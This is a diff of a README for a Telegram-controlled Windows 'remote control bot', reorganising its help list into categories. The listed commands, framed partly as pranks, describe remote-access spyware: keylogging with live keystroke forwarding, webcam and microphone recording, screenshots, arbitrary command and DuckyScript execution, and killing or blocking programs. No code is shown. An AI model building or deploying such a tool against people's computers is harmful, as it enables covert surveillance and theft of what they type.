@@ -3,56 +3,69 @@ Remote Control Bot, inspired to the previous creation named "Peppino", this one 
 (only tested on Windows10/11)
 
 ```/help: 
-stop - Stops the bot.
-id - Get Owner Chat ID.  
-pss - Play "psst" sound.  
-bsend - Send custom text.  
-altf4 - Simulate Alt + F4.  
-breath - Play breathing sound.  
-selphie - Take a webcam selfie.  
-shutdown - Shut down the PC.  
-duckyhelp - Show Duckyscript tutorial.  
-jumpscare - Show random jumpscare.  
-jumpscarenoaudio - Jumpscare no audio.
-screenshot - Capture screen.  
-fullclip - Record screen + webcam.  
-plankton - Plankton.
-planktonnoaudio - Plankton no audio.
-gabinetti - Gabinetti nella villa.
-webcamclip - Record webcam.  
-screenclip - Record screen.  
+🛑 System & Shutdown
+shutdown - Shut down the PC.
+fakeshutdown - Fake system shutdown.
+altf4 - Simulate Alt + F4.
+clear - Removes all cv2 windows, closes webcam and removes temporary files.
+📸 Camera & Screen
+selphie - Take a webcam selfie.
+screenshot - Capture screen.
+fullclip - Record screen + webcam.
+webcamclip - Record webcam.
+screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
-messagebox - Show a custom message box.  
-messagespam - Spam message boxes.  
-fakeshutdown - Fake system shutdown.  
-invertedscreen - Shows inverted colors screenshot.
-distortedscreen - Shows distorted screenshot.
-execute - Run system command.  
-microphone - Record mic audio.  
-browser - Open URL in browser.
-quickmenu - Opens a quick menu.
 waitforface - Send a webcam photo when face is detected till timeout.
-keylogger - Records pressed keys on keyboard.
-livekeylogger - Sends live updates about what's being typed on the keyboard.
-setvolume - Set computer's volume level.
-getvolume - Gets the computer's volume level.
-processkiller - Shows a table of processes that you can kill.
-terminateprocess - Kills a process by name.
-camerawallpaper - Sets webcam's frames as wallpaper.
-setvideowallpaper - Sets a video as wallpaper.
-mousecontroller - Sends a mouse controlling menu.
+🔊 Audio & Volume
+breath - Play breathing sound.
+pss - Play "psst" sound.
+microphone - Record mic audio.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
+setvolume - Set computer's volume level.
+getvolume - Gets the computer's volume level.
 tralalerotralala - Plays italian brainrot.
+😈 Pranks & Visuals
+jumpscare - Show random jumpscare.
+jumpscarenoaudio - Jumpscare no audio.
+invertedscreen - Shows inverted colors screenshot.
+distortedscreen - Shows distorted screenshot.
+messagebox - Show a custom message box.
+messagespam - Spam message boxes.
+camerawallpaper - Sets webcam's frames as wallpaper.
+setvideowallpaper - Sets a video as wallpaper.
+💻 System Control
+execute - Run system command.
+processkiller - Shows a table of processes that you can kill.
+terminateprocess - Kills a process by name.
+randomkeyboard - Sets all user's input to random characters.
+capslock - Activates capslock.
+mousecontroller - Sends a mouse controlling menu.
+📋 Messaging
+bsend - Send custom text.
+id - Get Owner Chat ID.
+quickmenu - Opens a quick menu.
+🔒 Can't Open List
 cantopenadd - Adds process to cantopenlist.
 cantopenremove - Removes process from cantopenlist.
 cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.
-clear - Removes all cv2 windows, closes webcam and removes temporary files.
+🧠 Keylogger
+keylogger - Records pressed keys on keyboard.
+livekeylogger - Sends live updates about what's being typed on the keyboard.
+🦑 Misc
+plankton - Plankton.
+planktonnoaudio - Plankton no audio.
+gabinetti - Gabinetti nella villa.
+duckyscript - Execute duckyscript string.
+duckyhelp - Show Duckyscript tutorial.
+browser - Open URL in browser.
+📎 File Input Commands
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
 *sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
 *sending an audio/voice* - Will play the audio/voice in the background.
 *sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
+📚 Multi-Command
 You can run multiple commands at the same time by sending them in the same message but separated by a comma.
 For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
 jumpscare while recording screen and webcam
